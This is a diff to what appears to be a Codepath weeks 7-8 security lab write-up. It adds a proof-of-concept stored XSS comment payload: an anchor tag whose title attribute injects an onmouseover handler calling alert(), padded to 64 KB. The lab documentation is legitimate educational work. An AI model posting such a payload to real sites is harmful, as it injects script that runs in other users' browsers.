@@ -15,4 +15,6 @@ Codepath week 7-8
     The script would need to be 64kb long.
     
  ## Proof of Concept
-    ![](images/Screenshot(70).png)
+ ![](images/Screenshot(70).png)
+    Comment for attack:
+    <a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>
